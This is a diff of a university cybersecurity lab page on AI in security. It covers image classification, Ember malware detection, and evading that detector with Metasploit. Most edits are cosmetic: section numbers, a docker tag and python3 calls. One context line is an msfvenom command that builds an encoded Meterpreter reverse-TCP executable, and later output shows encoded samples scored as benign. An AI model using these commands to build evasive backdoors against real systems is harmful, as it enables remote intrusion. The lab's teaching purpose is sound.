@@ -3,7 +3,7 @@
 ## <<\<NOT READY>>>
 
 {% hint style="warning" %}
-PLEASE NOTE: This lab image uses a lot of storage space (image size is 2.2GB, storage size is almost 4GB!), so ensure you have enough space on your hard drive before proceeding.
+PLEASE NOTE: This lab image uses a lot of storage space (image size is 2GB, storage size is almost 4GB!), so ensure you have enough space on your hard drive before proceeding.
 {% endhint %}
 
 {% hint style="danger" %}
@@ -14,7 +14,7 @@ Walkthrough video:
 
 **AI 10-1** [https://www.youtube.com/watch?v=6LhD8jUO1aY](https://www.youtube.com/watch?v=6LhD8jUO1aY)
 
-## Intro to AI and Cybersecurity
+## 1. Intro to AI and Cybersecurity
 
 Artificial Intelligence is a collection of technologies that allows computers to simulate human intelligence. Its applicability in cybersecurity involves all aspects of AI, including natural language processing, speech recognition, expert systems, robotics and vision. Fundamental to these types of AI is machine learning, a technology that uses an approach to learning that tries and mimics the way nerve cells work in the brain.
 
@@ -130,7 +130,7 @@ You can right click on this and save it to your share folder and then run the pr
 
 Try with your own images - note that they need to be the appropriate size of 700px wide so scale them down by resizing in photo editing software if they are larger.
 
-## Malware recognition with Ember
+## 2. Malware recognition with Ember
 
 Detecting malware relies on a static analysis of features such as the hash of the file and its use of strings (as we saw when we used Yara to identify malware). This is fine if you encounter malware that is something you have in a database of malware samples. Machine learning however tries to identify new malware by analysing the features and using a model that has been trained on millions of previous samples to be able to answer the question of whether the program is malware or not, rather than identifying the specific type of malware.
 
@@ -141,7 +141,7 @@ To do this, Ember uses a framework called LIEF that will analyse Windows (and ot
 Let's start the docker container to run Ember:
 
 ```
-docker run -it --rm uwacyber/cits1003-labs:ai
+docker run -it --rm uwacyber/cits1003-labs:ai-malware
 ```
 
 To test the model `cd` on the same docker container to the directory `/opt/ember`. The model has been pre-trained and so you don't need to do that, although if you are interested, you can (look at the GitHub page).
@@ -149,7 +149,7 @@ To test the model `cd` on the same docker container to the directory `/opt/ember
 To test the malware, we can use the following command:
 
 ```
-python scripts/classify_binaries.py -m ember_model_2018.txt malware
+python3 scripts/classify_binaries.py -m ember_model_2018.txt malware
 ```
 
 ```bash
@@ -170,7 +170,7 @@ The malware is actually _Trickbot_, which is a banking trojan.
 We can now try with a normal Windows program `git.exe`
 
 ```
-python scripts/classify_binaries.py -m ember_model_2018.txt git.exe
+python3 scripts/classify_binaries.py -m ember_model_2018.txt git.exe
 ```
 
 ```bash
@@ -194,7 +194,7 @@ In other words, a practically 0 score for it being malware.
 
 **Flag: Enter the full classification probability for the `malware` you found above**
 
-## Evading the classification Msfvenom and Meterpreter
+## 3. Evading the classification Msfvenom and Meterpreter
 
 `Msfvenom` is a utility that comes with what is called an exploitation framework called _Metasploit_. Metasploit is a sophisticated toolset that is used by penetration testers (and hackers) to explore vulnerabilities and exploit them. `Msfvenom` can generate various payloads that when run on a target machine, will create remote access to that machine for attackers. One of these payloads is called a `Meterpreter shell` and normally this is recognised as malware by anti-malware software.
 
@@ -310,16 +310,16 @@ msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.34 LPORT=4443 \
 -f exe -e x86/shikata_ga_nai > /volume1/meterpreter3.exe
 ```
 
-Now that we have the three different samples, we can go back to our classifier in the `ai` container and see what happens. Launch the ai container with the `volume1` attached (it will be a new container instance of ai image):
+Now that we have the three different samples, we can go back to our classifier in the `ai-malware` container and see what happens. Launch the `ai-malware` container with the `volume1` attached (it will be a new container instance of the `ai-malware` image):
 
 ```
-docker run -v volume1:/volume1 -it --rm uwacyber/cits1003-labs:ai
+docker run -v volume1:/volume1 -it --rm uwacyber/cits1003-labs:ai-malware
 ```
 
 I have moved the meterpreter files into the `/opt/ember` directory. With the first version `meterpreter1.exe` we get:
 
 ```bash
-root@cb69acf0fc22:/opt/ember# python scripts/classify_binaries.py -m ember_model_2018.txt meterpreter1.exe
+root@cb69acf0fc22:/opt/ember# python3 scripts/classify_binaries.py -m ember_model_2018.txt meterpreter1.exe
 WARNING: EMBER feature version 2 were computed using lief version 0.9.0-
 WARNING:   lief version 0.11.5-37bc2c9 found instead. There may be slight inconsistencies
 WARNING:   in the feature calculations.
@@ -332,7 +332,7 @@ Definitely malware!
 However, when we run the second version, we get:
 
 ```bash
-root@cb69acf0fc22:/opt/ember# python scripts/classify_binaries.py -m ember_model_2018.txt meterpreter2.exe
+root@cb69acf0fc22:/opt/ember# python3 scripts/classify_binaries.py -m ember_model_2018.txt meterpreter2.exe
 WARNING: EMBER feature version 2 were computed using lief version 0.9.0-
 WARNING:   lief version 0.11.5-37bc2c9 found instead. There may be slight inconsistencies
 WARNING:   in the feature calculations.
@@ -344,7 +344,7 @@ So, according to the classifier, this is likely to be a normal, and safe, binary
 And for the last one:
 
 ```bash
-root@cb69acf0fc22:/opt/ember# python scripts/classify_binaries.py -m ember_model_2018.txt meterpreter3.exe
+root@cb69acf0fc22:/opt/ember# python3 scripts/classify_binaries.py -m ember_model_2018.txt meterpreter3.exe
 WARNING: EMBER feature version 2 were computed using lief version 0.9.0-
 WARNING:   lief version 0.11.5-37bc2c9 found instead. There may be slight inconsistencies
 WARNING:   in the feature calculations.
